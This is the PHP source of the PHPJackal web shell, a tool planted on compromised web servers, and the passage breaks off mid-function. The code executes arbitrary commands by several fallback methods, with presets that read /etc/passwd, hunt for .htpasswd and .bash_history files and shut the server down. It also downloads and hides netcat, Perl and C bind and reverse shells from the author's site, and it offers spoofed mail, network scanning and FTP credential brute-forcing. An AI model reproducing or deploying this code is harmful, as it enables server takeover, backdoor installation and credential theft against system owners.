<?php
#--Config--#
$login_password='r00t';
#----------#
error_reporting(E_ALL);
ignore_user_abort(true);
set_time_limit(0);
ini_set('max_execution_time','0');
ini_set('memory_limit','9999M');
ini_set('output_buffering',0);
set_magic_quotes_runtime(0);
if(!isset($_SERVER))$_SERVER=&$HTTP_SERVER_VARS;
if(!isset($_POST))$_POST=&$HTTP_POST_VARS;
if(!isset($_GET))$_GET=&$HTTP_GET_VARS;
if(!isset($_COOKIE))$_COOKIE=&$HTTP_COOKIE_VARS;
if(!isset($_FILES))$_FILES=&$HTTP_POST_FILES;
$_REQUEST = array_merge($_GET,$_POST);
if(get_magic_quotes_gpc()){
foreach($_REQUEST as $key=>$value)$_REQUEST[$key]=stripslashes($value);
}
function hlinK($str=''){
$myvars=array('modE','chmoD','workingdiR','urL','cracK','imagE','namE','filE','downloaD','seC','cP','mV','rN','deL');
$ret=$_SERVER['PHP_SELF'].'?';
$new=explode('&',$str);
foreach($_GET as $key => $v){
$add=1;
foreach($new as $m){
$el=explode('=',$m);
if($el[0]==$key)$add=0;
}
if($add){if(!in_array($key,$myvars))$ret.="$key=$v&";}
}
$ret.=$str;
return $ret;
}
$et='</td></tr></table>';
if(!empty($login_password)){
if(!empty($_REQUEST['fpassw'])){
if($_REQUEST['fpassw']==$login_password)setcookie('passw',md5($_REQUEST['fpassw']));
header('Location: '.hlinK());
}
if(empty($_COOKIE['passw']) || $_COOKIE['passw']!=md5($login_password))die("<html><body><table><form method=post><tr><td>Password:</td><td><input type=hidden name=seC value=about><input type=password name=fpassw></td></tr><tr><td></td><td><input type=submit value=login></form>$et</body></html>");
}
if(!empty($_REQUEST['workingdiR']))chdir($_REQUEST['workingdiR']);
$disablefunctions=ini_get('disable_functions');
$disablefunctions=explode(',',$disablefunctions);
function checkthisporT($ip,$port,$timeout,$type=0){
if(!$type){
$scan=fsockopen($ip,$port,$n,$s,$timeout);
if($scan){fclose($scan);return 1;}
}
elseif(function_exists('socket_set_timeout')){
$scan=fsockopen("udp://$ip",$port);
if($scan){
socket_set_timeout($scan,$timeout);
fwrite($scan,"\x00");
$s=time();
fread($scan,1);
if((time()-$s)>=$timeout){fclose($scan);return 1;}
}
}
return 0;
}
if(!function_exists('file_get_contents')){
function file_get_contents($addr){
$a=fopen($addr,'r');
$tmp=fread($a,filesize($a));
fclose($a);
if($a)return $tmp;else return null;
}
}
if(!function_exists('file_put_contents')){
function file_put_contents($addr,$con){
$a=fopen($addr,'w');
if(!$a)return 0;
$t=fwrite($a,$con);
fclose($a);
if($t)return strlen($con);
return 0;
}
}
function file_add_contentS($addr,$con){
$a=fopen($addr,'a');
if(!$a)return 0;
fwrite($a,$con);
fclose($a);
return strlen($con);
}
if(!empty($_REQUEST['chmoD']) && !empty($_REQUEST['modE']))chmod($_REQUEST['chmoD'],'0'.$_REQUEST['modE']);
if(!empty($_REQUEST['downloaD'])){
ob_clean();
$dl=$_REQUEST['downloaD'];
$con=file_get_contents($dl);
header('Content-type: application/octet-stream');
header("Content-disposition: attachment; filename=\"$dl\";");
header('Content-length: '.strlen($con));
echo $con;
exit;
}
if(!empty($_REQUEST['imagE'])){
$img=$_REQUEST['imagE'];
header('Content-type: imagE/gif');
header("Content-length: ".filesize($img));
header("Last-Modified: ".date('r',filemtime($img)));
echo file_get_contents($img);
exit;
}
if(!empty($_REQUEST['exT'])){
$ex=$_REQUEST['exT'];
$e=get_extension_funcs($ex);
echo '<html><head><title>'.htmlspecialchars($ex).'</title></head><body><b>Functions:</b><br>';foreach($e as $k=>$f){$i=$k+1;echo "$i)$f ";if(in_array($f,$disablefunctions))echo '<font color=red>DISABLED</font>';echo '<br>';}
echo '</body></html>';
exit;
}
header('Cache-Control: no-cache, must-revalidate');
header('Expires: Mon, 7 Aug 1987 05:00:00 GMT');
function showsizE($size){
if($size>=1073741824)$size=round(($size/1073741824),2).' GB';
elseif($size>=1048576)$size=round(($size/1048576),2).' MB';
elseif($size>=1024)$size=round(($size/1024),2).' KB';
else $size.=' B';
return $size;
}
$windows=(substr((strtoupper(php_uname())),0,3)=='WIN')?1:0;
$errorbox="<table border=0 cellpadding=0 cellspacing=0 style='border-collapse: collapse' bgcolor='#333333' width='100%'><tr><td><b>Error: </b>";
$v='1.9';
$cwd=getcwd();
$msgbox="<br><table border=0 cellpadding=0 cellspacing=0 style='border-collapse: collapse' bgcolor='#333333' width='100%'><tr><td align='center'>";
$intro="<center><table border=0 style='border-collapse: collapse'><tr><td bgcolor='#666666'><b>Script:</b><br>".str_repeat('-=-',25)."<br><b>Name:</b> PHPJackal<br><b>Version:</b> $v<br><br><b>Author:</b><br>".str_repeat('-=-',25)."<br><b>Name:</b> NetJackal<br><b>Country:</b> Iran<br><b>Website:</b> <a href='http://netjackal.by.ru/' target='_blank'>http://netjackal.by.ru/</a><br><b>Email:</b> <a href='mailto:nima_501@yahoo.com?subject=PHPJackal'>nima_501@yahoo.com</a><br><noscript>".str_repeat('-=-',25)."<br><b>Error: Enable JavaScript in your browser!!!</b></noscript>$et</center>";
$footer="${msgbox}PHPJackal v$v - Powered By <a href='http://netjackal.by.ru/' target='_blank'>NetJackal</a>$et";
$hcwd="<input type=hidden name=workingdiR value='$cwd'>";
$t="<table border=0 style='border-collapse: collapse' width='40%'><tr><td width='40%' bgcolor='#333333'>";
$crack="</td><td bgcolor='#333333'></td></tr><form method='POST' name=form><tr><td width='20%' bgcolor='#666666'>Dictionary:</td><td bgcolor='#666666'><input type=text name=dictionary size=35></td></tr><tr><td width='20%' bgcolor='#808080'>Dictionary type:</td><td bgcolor='#808080'><input type=radio name=combo checked value=0 onClick='document.form.user.disabled = false;' style='border-width:1px;background-color:#808080;'>Simple (P)<input type=radio value=1 name=combo onClick='document.form.user.disabled = true;' style='border-width:1px;background-color:#808080;'>Combo (U:P)</td></tr><tr><td width='20%' bgcolor='#666666'>Username:</td><td bgcolor='#666666'><input type=text size=35 value=root name=user></td></tr><tr><td width='20%' bgcolor='#808080'>Server:</td><td bgcolor='#808080'><input type=text name=target value=localhost size=35></td></tr><tr><td width='20%' bgcolor='#666666'><input type=checkbox name=loG value=1 onClick='document.form.logfilE.disabled = !document.form.logfilE.disabled;' style='border-width:1px;background-color:#666666;' checked>Log</td><td bgcolor='#666666'><input type=text name=logfilE size=25 value='".whereistmP().DIRECTORY_SEPARATOR.".log'> $hcwd <input class=buttons type=submit value=Start></form>$et</center>";
function checkfunctioN($func){
global $disablefunctions,$safemode;
$safe=array('passthru','system','exec','exec','shell_exec','popen','proc_open');
if($safemode=='ON' && in_array($func,$safe))return 0;
elseif(function_exists($func) && is_callable($func) && !in_array($func,$disablefunctions))return 1;
return 0;
}
function whereistmP(){
$uploadtmp=ini_get('upload_tmp_dir');
$uf=getenv('USERPROFILE');
$af=getenv('ALLUSERSPROFILE');
$se=ini_get('session.save_path');
$envtmp=(getenv('TMP'))?getenv('TMP'):getenv('TEMP');
if(is_dir('/tmp') && is_writable('/tmp'))return '/tmp';
if(is_dir('/usr/tmp') && is_writable('/usr/tmp'))return '/usr/tmp';
if(is_dir('/var/tmp') && is_writable('/var/tmp'))return '/var/tmp';
if(is_dir($uf) && is_writable($uf))return $uf;
if(is_dir($af) && is_writable($af))return $af;
if(is_dir($se) && is_writable($se))return $se;
if(is_dir($uploadtmp) && is_writable($uploadtmp))return $uploadtmp;
if(is_dir($envtmp) && is_writable($envtmp))return $envtmp;
return '.';
}
function shelL($command){
global $windows;
$exec=$output='';
$dep[]=array('pipe','r');$dep[]=array('pipe','w');
if(checkfunctioN('passthru')){ob_start();passthru($command);$exec=ob_get_contents();ob_clean();ob_end_clean();}
elseif(checkfunctioN('system')){$tmp=ob_get_contents();ob_clean();system($command);$output=ob_get_contents();ob_clean();$exec=$tmp;}
elseif(checkfunctioN('exec')){exec($command,$output);$output=join("\n",$output);$exec=$output;}
elseif(checkfunctioN('shell_exec'))$exec=shell_exec($command);
elseif(checkfunctioN('popen')){$output=popen($command,'r');while(!feof($output)){$exec=fgets($output);}pclose($output);}
elseif(checkfunctioN('proc_open')){$res=proc_open($command,$dep,$pipes);while(!feof($pipes[1])){$line=fgets($pipes[1]);$output.=$line;}$exec=$output;proc_close($res);}
elseif(checkfunctioN('win_shell_execute'))$exec=winshelL($command);
elseif(checkfunctioN('win32_create_service'))$exec=srvshelL($command);
elseif(is_object($ws=new COM('WScript.Shell')))$exec=comshelL($command,$ws);
return $exec;
}
function getiT($get){
$fo=strtolower(ini_get('allow_url_fopen'));
$ui=strtolower(ini_get('allow_url_include'));
if($fo || $fo=='on')$con=file_get_contents($get);
elseif($ui || $ui=='on'){
ob_start();
include('http://netjackal.net/');
$con=ob_get_contents();
ob_end_clean();
}
else{
$u=parse_url($get);
$host=$u['host'];$file=(empty($u['path']))?'/':$u['path'];$port=(empty($u['port']))?80:$u['port'];
$url=fsockopen($host,$port,$en,$es,12);
fputs($url,"GET $file HTTP/1.0\r\nAccept-Encoding: text\r\nHost: $host\r\nReferer: $host\r\nUser-Agent: Mozilla/5.0 (compatible; Konqueror/3.1; FreeBSD)\r\n\r\n");
$tmp=$con='';
while($tmp!="\r\n")$tmp=fgets($url);
while(!feof($url))$con.=fgets($url);
}
return $con;
}
function downloadiT($get,$put){
$con=getiT($get);
$mk=file_put_contents($put,$con);
if($mk)return 1;
return 0;
}
function winshelL($command){
$name=whereistmP()."\\".uniqid('NJ');
win_shell_execute('cmd.exe','',"/C $command >\"$name\"");
sleep(1);
$exec=file_get_contents($name);
unlink($name);
return $exec;
}
function srvshelL($command){
$name=whereistmP()."\\".uniqid('NJ');
$n=uniqid('NJ');
$cmd=(empty($_SERVER['ComSpec']))?'d:\\windows\\system32\\cmd.exe':$_SERVER['ComSpec'];
win32_create_service(array('service'=>$n,'display'=>$n,'path'=>$cmd,'params'=>"/c $command >\"$name\""));
win32_start_service($n);
win32_stop_service($n);
win32_delete_service($n);
sleep(1);
$exec=file_get_contents($name);
unlink($name);
return $exec;
}
function comshelL($command,$ws){
$exec=$ws->exec ("cmd.exe /c $command"); 
$so=$exec->StdOut();
return $so->ReadAll();
}
function smtpchecK($addr,$user,$pass,$timeout){
$sock=fsockopen($addr,25,$n,$s,$timeout);
if(!$sock)return -1;
fread($sock,1024);
fputs($sock,'ehlo '.uniqid('NJ')."\r\n");
$res=substr(fgets($sock,512),0,1);
if($res!='2')return 0;
fgets($sock,512);fgets($sock,512);fgets($sock,512);
fputs($sock,"AUTH LOGIN\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='334')return 0;
fputs($sock,base64_encode($user)."\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='334')return 0;
fputs($sock,base64_encode($pass)."\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='235')return 0;
return 1;
}
function mysqlchecK($host,$user,$pass,$timeout){
if(function_exists('mysql_connect')){
$l=mysql_connect($host,$user,$pass);
if($l)return 1;
}
return 0;
}
function mssqlchecK($host,$user,$pass,$timeout){
if(function_exists('mssql_connect')){
$l=mssql_connect($host,$user,$pass);
if($l)return 1;
}
return 0;
}
function checksmtP($host,$timeout){
$from=strtolower(uniqid('nj')).'@'.strtolower(uniqid('nj')).'.com';
$sock=fsockopen($host,25,$n,$s,$timeout);
if(!$sock)return -1;
$res=substr(fgets($sock,512),0,3);
if($res!='220')return 0;
fputs($sock,'HELO '.uniqid('NJ')."\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='250')return 0;
fputs($sock,"MAIL FROM: <$from>\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='250')return 0;
fputs($sock,"RCPT TO: <contact@persianblog.com>\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='250')return 0;
fputs($sock,"DATA\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='354')return 0;
fputs($sock,"From: ".uniqid('NJ')." ".uniqid('NJ')." <$from>\r\nSubject: ".uniqid('NJ')."\r\nMIME-Version: 1.0\r\nContent-Type: text/plain;\r\n\r\n".uniqid('Hello ',true)."\r\n.\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='250')return 0;
return 1;
}
function replace_stR($s,$h){
$ret=$h;
foreach($s as $k=>$r)$ret=str_replace($k,$r,$ret);
return $ret;
}
function check_urL($url,$method,$search='200',$timeout=3){
$u=parse_url($url);
$method=strtoupper($method);
$host=$u['host'];$file=(!empty($u['path']))?$u['path']:'/';$port=(empty($u['port']))?80:$u['port'];
$data=(!empty($u['query']))?$u['query']:'';
if(!empty($data))$data="?$data";
$sock=fsockopen($host,$port,$en,$es,$timeout);
if($sock){
fputs($sock,"$method $file$data HTTP/1.0\r\n");
fputs($sock,"Host: $host\r\n");
if($method=='GET')fputs($sock,"\r\n");
elseif($method=='POST')fputs($sock,'Content-Type: application/x-www-form-urlencoded\r\nContent-length: '.strlen($data)."\r\nAccept-Encoding: text\r\nConnection: close\r\n\r\n$data");
else return 0;
if($search=='200')if(strstr(fgets($sock),'200')){fclose($sock);return 1;}else{fclose($sock);return 0;}
while(!feof($sock)){
$res=fgets($sock);
if(!empty($res))if(strstr($res,$search)){fclose($sock);return 1;}
}
fclose($sock);
}
return 0;
}
function get_sw_namE($host,$timeout){
$sock=fsockopen($host,80,$en,$es,$timeout);
if($sock){
$page=uniqid('NJ');
fputs($sock,"GET /$page HTTP/1.0\r\n\r\n");
while(!feof($sock)){
$con=fgets($sock);
if(strstr($con,'Server:')){$ser=substr($con,strpos($con,' ')+1);return $ser;}
}
fclose($sock);
return -1;
}return 0;
}
function snmpchecK($ip,$com,$timeout){
$res=0;
$n=chr(0x00);
$packet=chr(0x30).chr(0x26).chr(0x02).chr(0x01).chr(0x00).chr(0x04).chr(strlen($com)).$com.chr(0xA0).chr(0x19).chr(0x02).chr(0x01).chr(0x01).chr(0x02).chr(0x01).$n.chr(0x02).chr(0x01).$n.chr(0x30).chr(0x0E).chr(0x30).chr(0x0C).chr(0x06).chr(0x08).chr(0x2B).chr(0x06).chr(0x01).chr(0x02).chr(0x01).chr(0x01).chr(0x01).$n.chr(0x05).$n;
$sock=fsockopen("udp://$ip",161);
if(function_exists('socket_set_timeout'))socket_set_timeout($sock,$timeout);
fputs($sock,$packet);
socket_set_timeout($sock,$timeout);
$res=fgets($sock);
fclose($sock);
if($res != '')return 1;else return 0;
}
$safemode=(ini_get('safe_mode') || strtolower(ini_get('safe_mode'))=='on')?'ON':'OFF';
if($safemode=='ON'){ini_restore('safe_mode');ini_restore('open_basedir');}
function brshelL(){
global $errorbox,$windows,$et,$hcwd;
$_REQUEST['C']=(isset($_REQUEST['C']))?$_REQUEST['C']:0;
$addr='http://netjackal.by.ru/br';
$error="$errorbox Can not make backdoor file, go to writeable folder.$et";
$n=uniqid('NJ_');
if(!$windows)$n=".$n";
$d=whereistmP();
$name=$d.DIRECTORY_SEPARATOR.$n;
$c=($_REQUEST['C'])?1:0;
if(!empty($_REQUEST['port']) && ($_REQUEST['port']<=65535) && ($_REQUEST['port']>=1)){
$port=(int)$_REQUEST['port'];
if($windows){
if($c){
$name.='.exe';
$bd=downloadiT("$addr/nc",$name);
shelL("attrib +H $name");
if(!$bd)echo $error;else shelL("$name -L -p $port -e cmd.exe");
}else{
$name=$name.'.pl';
$bd=downloadiT("$addr/winbind.p",$name);
shelL("attrib +H $name");
if(!$bd)echo $error;else shelL("perl $name $port");
}
}
else{
if($c){
$bd=downloadiT("$addr/bind.c",$name);
if(!$bd)echo $error;else shelL("cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $port &");
}else{
$bd=downloadiT("$addr/bind.p",$name);
if(!$bd)echo $error;else shelL("cd $d;perl $n $port &");
echo "<font color=blue>Backdoor is waiting for you on $port.<br></font>";
}
}
}
elseif(!empty($_REQUEST['rport']) && ($_REQUEST['rport']<=65535) && ($_REQUEST['rport']>=1) && !empty($_REQUEST['ip'])){
$ip=$_REQUEST['ip'];
$port=(int)$_REQUEST['rport'];
if($windows){
if($c){
$name.='.exe';
$bd=downloadiT("$addr/nc",$name);
shelL("attrib +H $name");
if(!$bd)echo $error;else shelL("$name $ip $port -e cmd.exe");
}else{
$name=$name.'.pl';
$bd=downloadiT("$addr/winrc.p",$name);
shelL("attrib +H $name");
if (!$bd)echo $error;else shelL("perl.exe $name $ip $port");
}
}
else{
if($c){
$bd=downloadiT("$addr/rc.c",$name);
if(!$bd)echo $error;else shelL("cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $ip $port &");
}else{
$bd=downloadiT("$addr/rc.p",$name);
if(!$bd)echo $error;else shelL("cd $d;perl $n $ip $port &");
}
}
echo '<font color=blue>Done!</font>';}
else{echo "<table border=0 style='border-collapse: collapse' width='100%'><tr><td><table border=0 style='border-collapse: collapse' width='50%'><tr><td width='50%' bgcolor='#333333'>Bind shell:</td><td bgcolor='#333333'></td></tr><form method='POST'><tr><td width='20%' bgcolor='#666666'>Port:</td><td bgcolor='#666666'><input type=text name=port value=55501 size=5></td></tr><tr><td width='20%' bgcolor='#808080'>Type:</td><td bgcolor='#808080'><input type=radio style='border-width:1px;background-color:#808080;' value=0 checked name=C>PERL<input type=radio style='border-width:1px;background-color:#808080;' name=C value=1>";if($windows)echo 'EXE';else echo 'C';echo"</td></tr><tr><td width='20%' bgcolor='#666666'></td><td bgcolor='#666666' align=right>$hcwd<input type=submit class=buttons value=Bind></form>$et</td><td><table border=0 style='border-collapse: collapse' width='50%'><tr><td width='40%' bgcolor='#333333'>Reverse shell:</td><td bgcolor='#333333'></td></tr><form method='POST'><tr><td width='20%' bgcolor='#808080'>IP:</td><td bgcolor='#808080'><input type=text name=ip value=";echo $_SERVER['REMOTE_ADDR'];echo " size=17></td></tr><tr><td width='20%' bgcolor='#666666'>Port:</td><td bgcolor='#666666'><input type=text name=rport value=53 size=5></td></tr><tr><td width='20%' bgcolor='#808080'>Type:</td><td bgcolor='#808080'><input type=radio style='border-width:1px;background-color:#808080;' value=0 checked name=C>PERL<input type=radio style='border-width:1px;background-color:#808080;' name=C value=1>";if($windows)echo 'EXE';else echo 'C';echo"</td></tr><tr><td width='20%' bgcolor='#666666'></td><td bgcolor='#666666' align=right>$hcwd<input class=buttons type=submit value=Connect></form>$et$et";}}
function showimagE($img){
echo "<center><img border=0 src='".hlinK("imagE=$img&&workingdiR=".getcwd())."'></center>";}
function editoR($file){
global $errorbox,$et,$hcwd,$cwd;
if(is_file($file)){
if(!is_readable($file)){echo "$errorbox File is not readable$et<br>";}
if(!is_writeable($file)){echo "$errorbox File is not writeable$et<br>";}
$data=file_get_contents($file);
echo "<center><table border=0 style='border-collapse: collapse' width='40%'><tr><td width='10%' bgcolor='#808080'><form method='POST'>$hcwd<input type=text value='".htmlspecialchars($file)."' size=75 name=file><input type=submit class=buttons name=Open value=Open></form>$et<br><table border=0 style='border-collapse: collapse' width='40%'><tr><td width='40%' bgcolor='#666666'><form method='POST'><textarea rows='18' name='edited' cols='64'>";
echo htmlspecialchars($data);
echo "</textarea></td></tr><tr><td width='10%' bgcolor='#808080'><input type=text value='$file' size=80 name=file></td></tr><td width='40%' bgcolor='#666666' align='right'>";
}
else {echo "<center><table border=0 style='border-collapse: collapse' width='40%'><tr><td width='10%' bgcolor='#808080'><form method='POST'><input type=text value='$cwd' size=75 name=file>$hcwd<input type=submit class=buttons name=Open value=Open></form>$et<br><table border=0 style='border-collapse: collapse' width='40%'><tr><td width='40%' bgcolor='#666666'><form method='POST'><textarea rows='18' name='edited' cols='63'></textarea></td></tr><tr><td width='10%' bgcolor='#808080'><input type=text value='$cwd' size=80 name=file></td></tr><td width='40%' bgcolor='#666666' align='right'>";
}
echo "$hcwd<input type=submit class=buttons name=Save value=Save></form>$et</center>";
}
function webshelL(){
global $windows,$hcwd,$et,$cwd;
if($windows){
$alias="<option value='netstat -an'>Display open ports</option><option value='tasklist'>List of processes</option><option value='systeminfo'>System information</option><option value='ipconfig /all'>IP configuration</option><option value='getmac'>Get MAC address</option><option value='net start'>Services list</option><option value='net view'>Machines in domain</option><option value='net user'>Users list</option><option value='shutdown -s -f -t 1'>Turn off the server</option>";
}
else{
$alias="<option value='netstat -an | grep -i listen'>Display open ports</option><option value='last -a -n 250 -i'>Show last 250 logged in users</option><option value='which wget curl lynx w3m'>Downloaders</option><option value='find / -perm -2 -type d -print'>Find world-writable directories</option><option value='find . -perm -2 -type d -print'>Find world-writable directories(in current directory)</option><option value='find / -perm -2 -type f -print'>Find world-writable files</option><option value='find . -perm -2 -type f -print'>Find world-writable files(in current directory)</option><option value='find / -type f -perm 04000 -ls'>Find files with SUID bit set</option><option value='find / -type f -perm 02000 -ls'>Find files with SGID bit set</option><option value='find / -name .htpasswd -type f'>Find .htpasswd files</option><option value='find / -type f -name .bash_history'>Find .bash_history files</option><option value='cat /etc/syslog.conf'>View syslog.conf</option><option value='cat cat /etc/hosts'>View hosts</option><option value='ps auxw'>List of processes</option>";
if(is_dir('/etc/valiases'))$alias.="<option value='ls -l /etc/valiases'>List of cPanel`s domains(valiases)</option>";if(is_dir('/etc/vdomainaliases'))$alias.="<option value='ls -l /etc/vdomainaliases'>List cPanel`s domains(vdomainaliases)</option>";if(file_exists('/var/cpanel/accounting.log'))$alias.="<option value='cat /var/cpanel/accounting.log'>Display cPanel`s log</option>";
if(is_dir('/var/spool/mail/'))$alias.="<option value='ls /var/spool/mail/'>Mailboxes list</option>";
}
echo "<center><table border=0 cellpadding=0 cellspacing=0 style='border-collapse: collapse' bgcolor='#333333' width='65%'><form method='POST'><tr><td width='20%'><b>Location:</b><input type=text name=workingdiR size=82 value='$cwd'><input class=buttons type=submit value=Change></form>$et<br><table border=0 cellpadding=0 cellspacing=0 style='border-collapse: collapse' bgcolor='#333333' width='65%'><tr><td><b>Web Shell:</b></td></tr><td bgcolor='#666666'><textarea rows='23' cols='79'>";
if(!empty($_REQUEST['cmd']))echo shelL($_REQUEST['cmd']);
echo"</textarea></td></tr><form method=post><tr><td bgcolor='#808080'><input type=text size=91 name=cmd value='";if(!empty($_REQUEST['cmd']))echo htmlspecialchars(($_REQUEST['cmd']));elseif(!$windows)echo "cat /etc/passwd";echo "'>$hcwd<input class=buttons type=submit value=Execute></td></tr></form></td></tr><form method=post><tr><td bgcolor='#808080'><select name='cmd' width=70>$alias</select>$hcwd<input class=buttons type=submit value=Execute></form>$et</table><center>";
}
function maileR(){
global $msgbox,$et,$hcwd;
if(!empty($_REQUEST['subject'])&&!empty($_REQUEST['body'])&&!empty($_REQUEST['from'])&&!empty($_REQUEST['to'])){
$to=$_REQUEST['to'];$from=$_REQUEST['from'];$subject=$_REQUEST['subject'];$body=$_REQUEST['body'];
if(mail($to,$subject,$body,"From: $from"))echo "$msgbox<b>Mail sent!</b><br>$et";
}
echo "<center><br><table border=0 cellpadding=0 cellspacing=0 style='border-collapse: collapse' bgcolor='#333333' width='50%'><tr><form method='POST'><td><b>Mailer:</b></td></tr><td width='20%' bgcolor='#666666'>SMTP</td><td bgcolor='#666666'>".ini_get('SMTP').' ('.ini_get('smtp_port').")</td></tr><tr><td bgcolor='#808080'>From:</td><td bgcolor='#808080'><input name=from type=text value='evil@hell.gov' size=55>$hcwd</td><tr><td width='25%' bgcolor='#666666'>To:</td><td bgcolor='#666666'><input name=to type=text value='";if(!empty($_ENV['SERVER_ADMIN']))echo $_ENV['SERVER_ADMIN'];else echo 'admin@'.getenv('HTTP_HOST'); echo "' size=55></td></tr><tr><td bgcolor='#808080'>Subject:</td><td bgcolor='#808080'><input name=subject type=text value='' size=55></td><tr><td bgcolor='#666666'>Body:</td><td bgcolor='#666666'><textarea rows='18' cols='43' name=body></textarea></td></tr><tr><td width='10%' bgcolor='#808080'></td><td bgcolor='#808080' align='right'><input type=submit class=buttons value=Send></form>$et";
}
function scanneR(){
global $hcwd,$et;
if(!empty($_SERVER['SERVER_ADDR']))$host=$_SERVER['SERVER_ADDR'];else $host='127.0.0.1';
$udp=(empty($_REQUEST['udp']))?0:1;$tcp=(empty($_REQUEST['tcp']))?0:1;
if(($udp||$tcp) && !empty($_REQUEST['target']) && !empty($_REQUEST['fromport']) && !empty($_REQUEST['toport']) && !empty($_REQUEST['timeout']) && !empty($_REQUEST['portscanner'])){
$target=$_REQUEST['target'];$from=(int)$_REQUEST['fromport'];$to=(int)$_REQUEST['toport'];$timeout=(int)$_REQUEST['timeout'];$nu=0;
echo '<font color=blue>Port scanning started against '.htmlspecialchars($target).':<br>';
$start=time();
for($i=$from;$i<=$to;$i++){
if($tcp){
if(checkthisporT($target,$i,$timeout)){
$nu++;
$ser='';
if(getservbyport($i,'tcp'))$ser='('.getservbyport($i,'tcp').')';
echo "$nu) $i $ser (<a href='telnet://$target:$i'>Connect</a>) [TCP]<br>";
}
}
if($udp)if(checkthisporT($target,$i,$timeout,1)){$nu++;$ser='';if(getservbyport($i,'udp'))$ser='('.getservbyport($i,'udp').')';echo "$nu) $i $ser [UDP]<br>";}
}
$time=time()-$start;
echo "Done! ($time seconds)</font>";
}
elseif(!empty($_REQUEST['securityscanner'])){
echo '<font color=blue>';
$start=time();
$from=$_REQUEST['from'];
$to=(int)$_REQUEST['to'];
$timeout=(int)$_REQUEST['timeout'];
$f=substr($from,strrpos($from,'.')+1);
$from=substr($from,0,strrpos($from,'.'));
if(!empty($_REQUEST['httpscanner'])){
echo 'Loading webserver bug list...';
$buglist=whereistmP().DIRECTORY_SEPARATOR.uniqid('BL');
$dl=downloadiT('http://www.cirt.net/nikto/UPDATES/1.36/scan_database.db',$buglist);
if($dl){$file=file($buglist);echo 'Done! scanning started.<br><br>';}else echo 'Failed!!! scanning started without webserver security testing...<br><br>';
}else{$fr=htmlspecialchars($from);echo "Scanning $fr.$f-$fr.$to:<br><br>";}
for($i=$f;$i<=$to;$i++){
$output=0;
$ip="$from.$i";
if(!empty($_REQUEST['nslookup'])){
$hn=gethostbyaddr($ip);
if($hn!=$ip)echo "$ip [$hn]<br>"; $output=1;}
if(!empty($_REQUEST['ipscanner'])){
$port=$_REQUEST['port'];
if(strstr($port,','))$p=explode(',',$port);else $p[0]=$port;
$open=$ser='';
foreach($p as $po){
$scan=checkthisporT($ip,$po,$timeout);
if($scan){
$ser='';
if($ser=getservbyport($po,'tcp'))$ser="($ser)";
$open.=" $po$ser ";
}
}
if($open){echo "$ip) Open ports:$open<br>";$output=1;}

}
if(!empty($_REQUEST['httpbanner'])){
$res=get_sw_namE($ip,$timeout);
if($res){
echo "$ip) Webserver software: ";
if($res==-1)echo 'Unknow';
else echo $res;
echo '<br>';
$output=1;
}
}
if(!empty($_REQUEST['httpscanner'])){
if(checkthisporT($ip,80,$timeout) && !empty($file)){
$admin=array('/admin/','/adm/');
$users=array('adm','bin','daemon','ftp','guest','listen','lp','mysql','noaccess','nobody','nobody4','nuucp','operator','root','smmsp','smtp','sshd','sys','test','unknown','uucp','web','www');
$nuke=array('/','/postnuke/','/postnuke/html/','/modules/','/phpBB/','/forum/');
$cgi=array('/cgi.cgi/','/webcgi/','/cgi-914/','/cgi-915/','/bin/','/cgi/','/mpcgi/','/cgi-bin/','/ows-bin/','/cgi-sys/','/cgi-local/','/htbin/','/cgibin/','/cgis/','/scripts/','/cgi-win/','/fcgi-bin/','/cgi-exe/','/cgi-home/','/cgi-perl/');
foreach($file as $v){
$vuln=array();
$v=trim($v);
if(!$v || $v{0}=='#')continue;
$v=str_replace('","','^',$v);
$v=str_replace('"','',$v);
$vuln=explode('^',$v);
$page=$cqich=$nukech=$adminch=$userch=$vuln[1];
if(strstr($page,'@CGIDIRS'))
foreach($cgi as $cg){
$cqich=str_replace('@CGIDIRS',$cg,$page);
$url="http://$ip$cqich";
$res=check_urL($url,$vuln[3],$vuln[2],$timeout);
if($res){$output=1;echo "$ip)".$vuln[4]." <a href='$url' target='_blank'>$url</a><br>";}
}
elseif(strstr($page,'@ADMINDIRS'))
foreach($admin as $cg){
$adminch=str_replace('@ADMINDIRS',$cg,$page);
$url="http://$ip$adminch";
$res=check_urL($url,$vuln[3],$vuln[2],$timeout);
if($res){$output=1;echo "$ip)".$vuln[4]." <a href='$url' target='_blank'>$url</a><br>";}
}
elseif(strstr($page,'@USERS'))
foreach($users as $cg){
$userch=str_replace('@USERS',$cg,$page);
$url="http://$ip$userch";
$res=check_urL($url,$vuln[3],$vuln[2],$timeout);
if($res){$output=1;echo "$ip)".$vuln[4]." <a href='$url' target='_blank'>$url</a><br>";}
}
elseif(strstr($page,'@NUKE'))
foreach($nuke as $cg){
$nukech=str_replace('@NUKE',$cg,$page);
$url="http://$ip$nukech";
$res=check_urL($url,$vuln[3],$vuln[2],$timeout);
if($res){$output=1;echo "$ip)".$vuln[4]." <a href='$url' target='_blank'>$url</a><br>";}
}
else{
$url="http://$ip$page";
$res=check_urL($url,$vuln[3],$vuln[2],$timeout);
if($res){$output=1;echo "$ip)".$vuln[4]." <a href='$url' target='_blank'>$url</a><br>";}
}
}
}
}
if(!empty($_REQUEST['smtprelay'])){
if(checkthisporT($ip,25,$timeout)){
$res='';
$res=checksmtP($ip,$timeout);
if($res==1){echo "$ip) SMTP relay found.<br>";$output=1;}
}
}
if(!empty($_REQUEST['snmpscanner'])){
if(checkthisporT($ip,161,$timeout,1)){
$com=$_REQUEST['com'];
$coms=$res='';
if(strstr($com,','))$c=explode(',',$com);else $c[0]=$com;
foreach($c as $v){
$ret=snmpchecK($ip,$v,$timeout);
if($ret)$coms.=" $v ";
}
if($coms!=''){echo "$ip) SNMP FOUND: $coms<br>";$output=1;}
}
}
if(!empty($_REQUEST['ftpscanner']) && function_exists('ftp_connect')){
if(checkthisporT($ip,21,$timeout)){
$usps=explode(',',$_REQUEST['userpass']);
foreach($usps as $v){
$user=substr($v,0,strpos($v,':'));
$pass=substr($v,strpos($v,':')+1);
if($pass=='[BLANK]')$pass='';
